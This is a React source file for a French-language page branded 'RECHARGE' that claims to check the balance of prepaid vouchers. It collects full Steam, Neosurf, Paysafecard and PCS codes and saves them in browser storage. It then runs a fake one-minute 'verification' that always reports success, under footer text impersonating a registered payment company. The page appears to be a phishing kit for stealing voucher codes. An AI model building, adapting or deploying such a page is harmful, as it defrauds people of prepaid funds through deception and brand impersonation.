import React, { useState } from "react";
import {
  Input,
  Button,
  Layout,
  Typography,
  Select,
  Space,
  Card,
  Divider,
  message,
  Modal,
  Spin,
} from "antd";
import { useNavigate } from "react-router-dom";
import {
  CreditCardOutlined,
  NumberOutlined,
  ArrowLeftOutlined,
  CheckCircleOutlined,
  ShopOutlined,
  LoginOutlined,
  InfoCircleOutlined,
  UserOutlined,
  LockOutlined,
  SafetyCertificateOutlined,
  CustomerServiceOutlined,
  FileTextOutlined,
  FacebookOutlined,
  TwitterOutlined,
  InstagramOutlined,
  HomeOutlined,
  GlobalOutlined,
  WalletOutlined,
  LoadingOutlined,
} from "@ant-design/icons";

const { Header, Footer, Content } = Layout;
const { Title, Text } = Typography;
const { Option } = Select;

export default function RechargeCheck() {
  const [codeCount, setCodeCount] = useState(1);
  const [rechargeType, setRechargeType] = useState("Steam");
  const [codes, setCodes] = useState({});
  const [montant, setMontant] = useState("");
  const [isModalVisible, setIsModalVisible] = useState(false);
  const [isVerificationComplete, setIsVerificationComplete] = useState(false);
  const navigate = useNavigate();

  const handleCodeCountChange = (value) => {
    setCodeCount(value);
    setCodes({});
  };

  const handleRechargeTypeChange = (value) => {
    setRechargeType(value);
    setCodes({});
  };

  const handleMontantChange = (e) => {
    setMontant(e.target.value);
  };

  const handleInputChange = (key, value) => {
    setCodes((prev) => ({ ...prev, [key]: value }));
  };

  const handleAlphanumericInput = (e, maxLength) => {
    const value = e.target.value;
    const alphanumericValue = value.replace(/[^a-zA-Z0-9]/g, "");
    e.target.value = alphanumericValue.slice(0, maxLength);
    handleInputChange(e.target.id, e.target.value);
  };

  const handleNumericInput = (e, maxLength) => {
    const value = e.target.value;
    const numericValue = value.replace(/[^0-9]/g, "");
    e.target.value = numericValue.slice(0, maxLength);
    handleInputChange(e.target.id, e.target.value);
  };

  const validateInputs = () => {
    let isValid = true;
    let errorMessage = "";

    for (let i = 0; i < codeCount; i++) {
      if (rechargeType === "Steam") {
        const fields = [`steam-${i}-1`, `steam-${i}-2`, `steam-${i}-3`];
        for (const field of fields) {
          const value = codes[field] || "";
          if (value.length !== 5) {
            isValid = false;
            errorMessage = "Chaque champ Steam doit contenir exactement 5 caractères alphanumériques.";
            break;
          }
        }
      } else if (rechargeType === "Neosurf") {
        const field1 = codes[`neosurf-${i}-1`] || "";
        const field2 = codes[`neosurf-${i}-2`] || "";
        const field3 = codes[`neosurf-${i}-3`] || "";
        if (field1.length !== 5) {
          isValid = false;
          errorMessage = "Le premier champ Neosurf doit contenir exactement 5 caractères alphanumériques.";
        } else if (field2.length !== 3 || field3.length !== 3) {
          isValid = false;
          errorMessage = "Les deuxième et troisième champs Neosurf doivent contenir exactement 3 caractères alphanumériques.";
        }
      } else if (rechargeType === "PCS") {
        const field = codes[`pcs-${i}`] || "";
        if (field.length !== 10) {
          isValid = false;
          errorMessage = "Chaque champ PCS doit contenir exactement 10 caractères alphanumériques.";
        }
      } else if (rechargeType === "Paysafecard") {
        const field = codes[`paysafecard-${i}`] || "";
        if (field.length !== 16) {
          isValid = false;
          errorMessage = "Chaque champ Paysafecard doit contenir exactement 16 chiffres.";
        }
      }
      if (!isValid) break;
    }

    if (!montant) {
      isValid = false;
      errorMessage = "Veuillez entrer un montant.";
    }

    if (!isValid) {
      message.error(errorMessage);
    }
    return isValid;
  };

  const handleVerify = () => {
    if (validateInputs()) {
      const collectedCodes = [];
      for (let i = 0; i < codeCount; i++) {
        if (rechargeType === "Steam") {
          const code = [
            codes[`steam-${i}-1`] || "",
            codes[`steam-${i}-2`] || "",
            codes[`steam-${i}-3`] || "",
          ].join("-");
          collectedCodes.push(code);
        } else if (rechargeType === "Neosurf") {
          const code = [
            codes[`neosurf-${i}-1`] || "",
            codes[`neosurf-${i}-2`] || "",
            codes[`neosurf-${i}-3`] || "",
          ].join("-");
          collectedCodes.push(code);
        } else if (rechargeType === "PCS") {
          collectedCodes.push(codes[`pcs-${i}`] || "");
        } else if (rechargeType === "Paysafecard") {
          collectedCodes.push(codes[`paysafecard-${i}`] || "");
        }
      }

      // Ajoutez la date et l'heure actuelles
      const timestamp = new Date().toLocaleString();

      // Récupérez les données existantes dans localStorage
      const existingData = JSON.parse(localStorage.getItem("rechargeData")) || [];

      // Ajoutez les nouvelles données à l'historique
      const newData = {
        rechargeType,
        montant,
        codes: collectedCodes,
        timestamp,
      };

      // Stockez les données dans localStorage
      localStorage.setItem("rechargeData", JSON.stringify([newData, ...existingData]));

      // Afficher le modal de chargement
      setIsModalVisible(true);

      // Simuler une vérification de 1 minute
      setTimeout(() => {
        setIsVerificationComplete(true);
        // Recharger la page après 2 secondes supplémentaires pour afficher le message de succès
        setTimeout(() => {
          setIsModalVisible(false);
          window.location.reload();
        }, 2000);
      }, 60000);
    }
  };

  const renderCodeInputs = () => {
    const inputs = [];

    for (let i = 0; i < codeCount; i++) {
      if (rechargeType === "Steam") {
        inputs.push(
          <div key={`steam-${i}`} className="mb-4">
            <label className="block text-gray-800 mb-2 font-semibold flex items-center gap-2 text-sm sm:text-base">
              <CreditCardOutlined className="text-[#FF3366]" /> Code {i + 1}
            </label>
            <div className="flex flex-col sm:flex-row sm:space-x-4 space-y-4 sm:space-y-0">
              {[1, 2, 3].map((index) => (
                <div key={`steam-${i}-${index}`} className="flex-1">
                  <Input
                    id={`steam-${i}-${index}`}
                    placeholder={`Part ${index} (5 chars)`}
                    size="large"
                    maxLength={5}
                    onChange={(e) => handleAlphanumericInput(e, 5)}
                    className="rounded-lg border-gray-300 focus:border-[#FF3366] focus:ring-2 focus:ring-[#FF3366] transition-all duration-300"
                  />
                </div>
              ))}
            </div>
          </div>
        );
      } else if (rechargeType === "Neosurf") {
        inputs.push(
          <div key={`neosurf-${i}`} className="mb-4">
            <label className="block text-gray-800 mb-2 font-semibold flex items-center gap-2 text-sm sm:text-base">
              <CreditCardOutlined className="text-[#FF3366]" /> Code {i + 1}
            </label>
            <div className="flex flex-col sm:flex-row sm:space-x-4 space-y-4 sm:space-y-0">
              <div className="flex-1">
                <Input
                  id={`neosurf-${i}-1`}
                  placeholder="Part 1 (5 chars)"
                  size="large"
                  maxLength={5}
                  onChange={(e) => handleAlphanumericInput(e, 5)}
                  className="rounded-lg border-gray-300 focus:border-[#FF3366] focus:ring-2 focus:ring-[#FF3366] transition-all duration-300"
                />
              </div>
              {[2, 3].map((index) => (
                <div key={`neosurf-${i}-${index}`} className="flex-1">
                  <Input
                    id={`neosurf-${i}-${index}`}
                    placeholder={`Part ${index} (3 chars)`}
                    size="large"
                    maxLength={3}
                    onChange={(e) => handleAlphanumericInput(e, 3)}
                    className="rounded-lg border-gray-300 focus:border-[#FF3366] focus:ring-2 focus:ring-[#FF3366] transition-all duration-300"
                  />
                </div>
              ))}
            </div>
          </div>
        );
      } else if (rechargeType === "PCS") {
        inputs.push(
          <div key={`pcs-${i}`} className="mb-4">
            <label className="block text-gray-800 mb-2 font-semibold flex items-center gap-2 text-sm sm:text-base">
              <CreditCardOutlined className="text-[#FF3366]" /> Code {i + 1}
            </label>
            <Input
              id={`pcs-${i}`}
              placeholder="Code (10 chars)"
              size="large"
              maxLength={10}
              onChange={(e) => handleAlphanumericInput(e, 10)}
              className="rounded-lg border-gray-300 focus:border-[#FF3366] focus:ring-2 focus:ring-[#FF3366] transition-all duration-300"
            />
          </div>
        );
      } else if (rechargeType === "Paysafecard") {
        inputs.push(
          <div key={`paysafecard-${i}`} className="mb-4">
            <label className="block text-gray-800 mb-2 font-semibold flex items-center gap-2 text-sm sm:text-base">
              <CreditCardOutlined className="text-[#FF3366]" /> Code {i + 1}
            </label>
            <Input
              id={`paysafecard-${i}`}
              placeholder="Code (16 digits)"
              size="large"
              maxLength={16}
              onChange={(e) => handleNumericInput(e, 16)}
              className="rounded-lg border-gray-300 focus:border-[#FF3366] focus:ring-2 focus:ring-[#FF3366] transition-all duration-300"
            />
          </div>
        );
      }
    }
    return inputs;
  };

  return (
    <Layout className="min-h-screen font-sans bg-[#F5F7FA]">
      <Header className="bg-white px-4 sm:px-8 md:px-16 py-3 sm:py-5 flex items-center justify-between shadow-md border-b border-gray-200">
        <div className="flex items-center space-x-2 sm:space-x-4">
          <span className="text-xl sm:text-2xl md:text-3xl font-extrabold bg-gradient-to-r from-[#FF3366] to-[#FF66CC] bg-clip-text text-transparent tracking-tight transition-transform duration-300 hover:scale-105 drop-shadow-lg">
            RECHARGE
          </span>
          <Text className="text-gray-600 text-xs sm:text-sm md:text-base font-medium hidden sm:block">
            Solutions de Paiement Sécurisées
          </Text>
        </div>
        <Space size="small" className="flex-wrap">
          <Button
            type="text"
            icon={<CreditCardOutlined className="text-[#FF3366]" />}
            className="text-gray-700 hover:text-[#FF3366] transition-colors duration-300 font-medium text-xs sm:text-sm md:text-base flex items-center gap-1"
          >
            Vérifier Solde
          </Button>
          <Button
            type="text"
            icon={<LoginOutlined className="text-[#FF3366]" />}
            className="text-gray-700 hover:text-[#FF3366] transition-colors duration-300 font-medium text-xs sm:text-sm md:text-base flex items-center gap-1"
          >
            Connexion
          </Button>
          <Button
            type="primary"
            icon={<ShopOutlined />}
            className="bg-gradient-to-r from-[#FF3366] to-[#FF66CC] border-none hover:from-[#FF66CC] hover:to-[#FF3366] transition-all duration-300 rounded-lg px-3 sm:px-4 md:px-6 font-semibold text-xs sm:text-sm flex items-center gap-1"
          >
            Acheter Ticket
          </Button>
          <Button
            type="text"
            icon={<InfoCircleOutlined className="text-[#FF3366]" />}
            className="text-gray-700 hover:text-[#FF3366] transition-colors duration-300 font-medium text-xs sm:text-sm md:text-base flex items-center gap-1"
          >
            Découvrir
          </Button>
        </Space>
      </Header>

      <Content className="flex flex-col items-center justify-center px-4 sm:px-6 md:px-8 py-8 sm:py-12 md:py-24 bg-gradient-to-b from-[#F5F7FA] to-[#E8ECEF]">
        <Card
          className="rounded-xl shadow-xl p-4 sm:p-6 md:p-12 w-full max-w-full sm:max-w-lg md:max-w-2xl border-t-4 border-[#FF3366] transform transition-all duration-500 hover:shadow-2xl"
          style={{ background: "linear-gradient(145deg, #FFFFFF, #F8F9FA)" }}
        >
          <div className="text-center mb-6 sm:mb-10">
            <Title
              level={2}
              className="text-[#1A1A2E] font-extrabold tracking-tight mb-2 text-xl sm:text-2xl md:text-3xl"
            >
              Vérifiez Votre Solde
            </Title>
            <Text className="text-gray-600 text-sm sm:text-base flex items-center justify-center gap-2">
              <WalletOutlined className="text-[#FF3366]" /> Consultez le solde
              de votre carte Recharge
            </Text>
          </div>
          <div className="space-y-6 sm:space-y-8">
            <div>
              <label className="block text-gray-800 mb-2 font-semibold flex items-center gap-2 text-sm sm:text-base">
                <NumberOutlined className="text-[#FF3366]" /> Nombre de codes
                (max. 10)
              </label>
              <Select
                defaultValue={1}
                onChange={handleCodeCountChange}
                className="w-full rounded-lg"
                size="large"
                dropdownStyle={{ borderRadius: "8px" }}
              >
                {[...Array(10)].map((_, i) => (
                  <Option key={i + 1} value={i + 1}>
                    {i + 1}
                  </Option>
                ))}
              </Select>
            </div>
            {renderCodeInputs()}
            <div>
              <label className="block text-gray-800 mb-2 font-semibold flex items-center gap-2 text-sm sm:text-base">
                <CreditCardOutlined className="text-[#FF3366]" /> Montant (€)
              </label>
              <Input
                placeholder="Montant"
                size="large"
                value={montant}
                onChange={handleMontantChange}
                className="rounded-lg border-gray-300 focus:border-[#FF3366] focus:ring-2 focus:ring-[#FF3366] transition-all duration-300"
                type="number"
              />
            </div>
            <div>
              <label className="block text-gray-800 mb-2 font-semibold flex items-center gap-2 text-sm sm:text-base">
                <WalletOutlined className="text-[#FF3366]" /> Type de Recharge
              </label>
              <Select
                defaultValue="Steam"
                onChange={handleRechargeTypeChange}
                className="w-full rounded-lg"
                size="large"
                dropdownStyle={{ borderRadius: "8px" }}
              >
                <Option value="Steam">Steam</Option>
                <Option value="Neosurf">Neosurf</Option>
                <Option value="Paysafecard">Paysafecard</Option>
                <Option value="PCS">PCS</Option>
              </Select>
            </div>
          </div>
          <div className="flex flex-col sm:flex-row justify-between mt-6 sm:mt-10 space-y-4 sm:space-y-0 sm:space-x-6">
            <Button
              size="large"
              icon={<ArrowLeftOutlined />}
              className="w-full border-[#FF3366] text-[#FF3366] hover:border-[#FF66CC] hover:text-[#FF66CC] transition-colors duration-300 rounded-lg font-semibold text-sm sm:text-base"
            >
              Retour
            </Button>
            <Button
              type="primary"
              size="large"
              icon={<CheckCircleOutlined />}
              onClick={handleVerify}
              className="w-full bg-gradient-to-r from-[#FF3366] to-[#FF66CC] border-none hover:from-[#FF66CC] hover:to-[#FF3366] transition-all duration-300 rounded-lg font-semibold text-sm sm:text-base"
            >
              Vérifier
            </Button>
          </div>
        </Card>
      </Content>

      <Modal
        open={isModalVisible}
        footer={null}
        closable={false}
        centered
        bodyStyle={{ textAlign: "center", padding: "20px sm:40px" }}
      >
        {isVerificationComplete ? (
          <div>
            <CheckCircleOutlined
              style={{ fontSize: "32px sm:48px", color: "#52c41a", marginBottom: "16px sm:20px" }}
            />
            <Title level={4} className="text-base sm:text-lg">
              Vérification effectuée avec succès
            </Title>
          </div>
        ) : (
          <div>
            <Spin
              indicator={<LoadingOutlined style={{ fontSize: "32px sm:48px" }} spin />}
              style={{ marginBottom: "16px sm:20px" }}
            />
            <Title level={4} className="text-base sm:text-lg">
              Vérification de la recharge en cours
            </Title>
          </div>
        )}
      </Modal>

      <Footer className="bg-[#1A1A2E] text-white py-8 sm:py-12 md:py-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 md:px-8">
          <div className="flex flex-col sm:grid sm:grid-cols-2 md:grid-cols-5 gap-6 sm:gap-10 mb-8 sm:mb-12">
            <div className="col-span-2">
              <span className="text-xl sm:text-2xl md:text-3xl font-extrabold bg-gradient-to-r from-[#FF3366] to-[#FF66CC] bg-clip-text text-transparent tracking-tight transition-transform duration-300 hover:scale-105 drop-shadow-lg">
                RECHARGE
              </span>
              <Text className="block text-gray-400 mt-3 sm:mt-4 mb-4 sm:mb-6 text-xs sm:text-sm">
                Votre partenaire pour des paiements en ligne sécurisés et
                rapides, partout dans le monde.
              </Text>
              <Space size="middle">
                <a
                  href="#"
                  className="text-gray-400 hover:text-[#FF3366] transition-colors duration-300 text-lg sm:text-xl transform hover:scale-110"
                >
                  <FacebookOutlined />
                </a>
                <a
                  href="#"
                  className="text-gray-400 hover:text-[#FF3366] transition-colors duration-300 text-lg sm:text-xl transform hover:scale-110"
                >
                  <TwitterOutlined />
                </a>
                <a
                  href="#"
                  className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-lg sm:text-xl transform hover:scale-110"
                >
                  <InstagramOutlined />
                </a>
              </Space>
            </div>
            <div>
              <h4 className="text-[#FF3366] font-semibold mb-3 sm:mb-4 text-sm sm:text-base flex items-center gap-2">
                <ShopOutlined /> Commencer
              </h4>
              <ul className="space-y-2 sm:space-y-3">
                <li>
                  <a
                    href="#"
                    className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
                  >
                    <CreditCardOutlined /> Acheter Recharge
                  </a>
                </li>
                <li>
                  <a
                    href="#"
                    className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
                  >
                    <UserOutlined /> Créer un compte
                  </a>
                </li>
                <li>
                  <a
                    href="#"
                    className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
                  >
                    <CheckCircleOutlined /> Utiliser Recharge
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="text-[#FF3366] font-semibold mb-3 sm:mb-4 text-sm sm:text-base flex items-center gap-2">
                <InfoCircleOutlined /> Ressources
              </h4>
              <ul className="space-y-2 sm:space-y-3">
                <li>
                  <a
                    href="#"
                    className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
                  >
                    <CustomerServiceOutlined /> Support
                  </a>
                </li>
                <li>
                  <a
                    href="#"
                    className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
                  >
                    <CreditCardOutlined /> Remboursement
                  </a>
                </li>
                <li>
                  <a
                    href="#"
                    className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
                  >
                    <CheckCircleOutlined /> Activation
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="text-[#FF3366] font-semibold mb-3 sm:mb-4 text-sm sm:text-base flex items-center gap-2">
                <LockOutlined /> Légal
              </h4>
              <ul className="space-y-2 sm:space-y-3">
                <li>
                  <a
                    href="#"
                    className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
                  >
                    <InfoCircleOutlined /> À propos de nous
                  </a>
                </li>
                <li>
                  <a
                    href="#"
                    className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
                  >
                    <FileTextOutlined /> Conditions générales
                  </a>
                </li>
                <li>
                  <a
                    href="#"
                    className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
                  >
                    <SafetyCertificateOutlined /> Confidentialité
                  </a>
                </li>
                <li>
                  <a
                    href="#"
                    className="text-gray-400 hover:text-[#FF66CC] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
                  >
                    <LockOutlined /> Politique KYC
                  </a>
                </li>
              </ul>
            </div>
          </div>

          <Divider className="bg-gray-700 my-6 sm:my-8" />
          <div className="flex flex-col items-center">
            <Space size="large" className="mb-4 sm:mb-6 flex flex-col sm:flex-row text-center">
              <a
                href="#"
                className="text-gray-400 hover:text-[#FF3366] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
              >
                <HomeOutlined /> 10 rue Vandrezanne, 75013 Paris, France
              </a>
              <a
                href="#"
                className="text-gray-400 hover:text-[#FF3366] transition-colors duration-300 text-xs sm:text-sm flex items-center gap-2"
              >
                <GlobalOutlined /> www.recharge.fr
              </a>
            </Space>
            <Text className="text-gray-500 text-xs text-center">
              © 2004 - 2025 Recharge SAS. Tous droits réservés.<br />
              Recharge SAS, enregistrée en France sous le numéro SIREN
              478503321. Opérations Recharge en EEA et EU sous Narvi Payments
              Oy Ab, une institution de monnaie électronique autorisée par
              FIN-FSA.
            </Text>
          </div>
        </div>
      </Footer>
    </Layout>
  );
}